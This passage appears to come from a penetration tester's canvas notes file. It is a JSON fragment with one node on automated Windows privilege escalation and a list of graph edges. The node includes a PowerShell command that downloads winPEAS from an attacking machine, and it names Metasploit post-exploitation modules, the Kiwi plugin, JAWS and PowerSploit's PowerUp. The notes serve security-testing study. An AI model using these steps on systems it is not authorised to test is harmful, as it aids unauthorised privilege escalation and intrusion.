		{"id":"f89489394c14691f","type":"text","text":"# Automated PrivEsc\n\nfor using powershell to download from attacking machine:\n\t`wget [url] -outfile winPEASx64.exe`\n\n`jaws-enum.ps1` https://github.com/411Hall/JAWS\n\nMSF Modules if you have meterpreter\n- See Kiwi Plugin in Metasploit\n- `/post/windows/gather/win_privs`\n- `/post/windows/gather/enum_logged_on_users`\n- `/post/windows/gather/checkvm`\n- `/post/windows/gather/enum_applications`\n- `/post/windows/gather/enum_computers`\n- `/post/windows/gather/enum_shares`\n\n\nPowerSploit - Windows Privilege Escalation\n- https://github.com/PowerShellMafia/PowerSploit/tree/master\n- PowerUp.ps1: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md\n- A privesc enumerator that uses different modules depending on different levels of privilege. Primarily searches for misconfigurations.\n- `. .\\PowerUp.ps1`\n- `Get-Command -Module Privesc` will return a list of commands\n- `Get-Help [command]` will give more details for each","x":-1520,"y":-1566,"width":561,"height":480}
	],
	"edges":[
		{"id":"b3e006e31ed041e6","fromNode":"ebaa5dfb21867981","fromSide":"top","toNode":"6e1609f54927f42c","toSide":"bottom"},
		{"id":"fe5381de214e4752","fromNode":"6e1609f54927f42c","fromSide":"top","toNode":"17a4e6b2601bafc5","toSide":"bottom"},
		{"id":"151dfa163fbcb7c3","fromNode":"6e1609f54927f42c","fromSide":"top","toNode":"7471463259b72e72","toSide":"bottom"},
		{"id":"f3c13f375480662a","fromNode":"ebaa5dfb21867981","fromSide":"bottom","toNode":"6af2ef205fb51a8c","toSide":"top"},
		{"id":"1e6e06308f10ce50","fromNode":"6af2ef205fb51a8c","fromSide":"left","toNode":"1fb61a5241457cc5","toSide":"right"},
		{"id":"e8da654d652cd50d","fromNode":"6af2ef205fb51a8c","fromSide":"bottom","toNode":"c2930116aaed0a07","toSide":"top"},
		{"id":"adfa2c6ada7033da","fromNode":"6af2ef205fb51a8c","fromSide":"bottom","toNode":"7de572afd5477953","toSide":"top"},
		{"id":"e9df6cfd156572e3","fromNode":"6af2ef205fb51a8c","fromSide":"bottom","toNode":"cd1fad5465981a2a","toSide":"top"},
		{"id":"f29ad51ee5650ea1","fromNode":"6af2ef205fb51a8c","fromSide":"bottom","toNode":"0aeaba9d3f5c6601","toSide":"top"},
		{"id":"59eb30f3e2301e03","fromNode":"6af2ef205fb51a8c","fromSide":"bottom","toNode":"b9266283750e0adb","toSide":"top"},
		{"id":"2e886ef7c19af084","fromNode":"6af2ef205fb51a8c","fromSide":"bottom","toNode":"f850d055c9759d0e","toSide":"top"},
		{"id":"20605431835d35cd","fromNode":"6af2ef205fb51a8c","fromSide":"bottom","toNode":"fa3a68da3d188fb2","toSide":"top"},
		{"id":"c49222c072a8f9b0","fromNode":"6e1609f54927f42c","fromSide":"right","toNode":"2aa05b57fc5a5f5a","toSide":"left"},
		{"id":"71c872e5003b6243","fromNode":"6e1609f54927f42c","fromSide":"left","toNode":"f89489394c14691f","toSide":"right"},
		{"id":"604dda1dfe4e61f9","fromNode":"6af2ef205fb51a8c","fromSide":"right","toNode":"2b6e1c4ed9322179","toSide":"left"},
		{"id":"88232a252f278531","fromNode":"ebaa5dfb21867981","fromSide":"left","toNode":"aed968e829d9aa76","toSide":"right"},
		{"id":"c331a816afa37f74","fromNode":"6e1609f54927f42c","fromSide":"top","toNode":"f038f2ef02d43e20","toSide":"bottom"},
		{"id":"1422f078c8af6c94","fromNode":"f038f2ef02d43e20","fromSide":"top","toNode":"6a6379e3525d3a27","toSide":"bottom"},
		{"id":"052c6a6ee7f811b5","fromNode":"6af2ef205fb51a8c","fromSide":"right","toNode":"606ea74494f03f83","toSide":"left"},
		{"id":"e2faf9ce006e43d1","fromNode":"7471463259b72e72","fromSide":"right","toNode":"e50538e9b64c8239","toSide":"left"},
		{"id":"75b954195caf8eb7","fromNode":"7471463259b72e72","fromSide":"top","toNode":"5103bbc095080cb2","toSide":"bottom"},
		{"id":"6af162105b364422","fromNode":"6e1609f54927f42c","fromSide":"right","toNode":"555e1214573888af","toSide":"left"},
		{"id":"0310a6d8ef37c0d8","fromNode":"6e1609f54927f42c","fromSide":"right","toNode":"4c60e8c5df7309ff","toSide":"left"},
		{"id":"8fb607ab4e59c0a2","fromNode":"ebaa5dfb21867981","fromSide":"right","toNode":"9b85df9bac3f6948","toSide":"left"},
		{"id":"b9c27f25369ee742","fromNode":"555e1214573888af","fromSide":"right","toNode":"522b26204208ae98","toSide":"left"},
		{"id":"b32e9e1ffdb90ab4","fromNode":"9b85df9bac3f6948","fromSide":"top","toNode":"0145bc0ac0b02a02","toSide":"bottom"},
		{"id":"32f7a01b0f7d6978","fromNode":"9b85df9bac3f6948","fromSide":"bottom","toNode":"68da7e4eb3e4d7f4","toSide":"top"},
		{"id":"8b6c76730fd97e99","fromNode":"9b85df9bac3f6948","fromSide":"right","toNode":"35f96a37821ece59","toSide":"left"},
		{"id":"022514b55d99cd2a","fromNode":"0145bc0ac0b02a02","fromSide":"top","toNode":"acc6bdb0d34b8111","toSide":"bottom"}
	]
}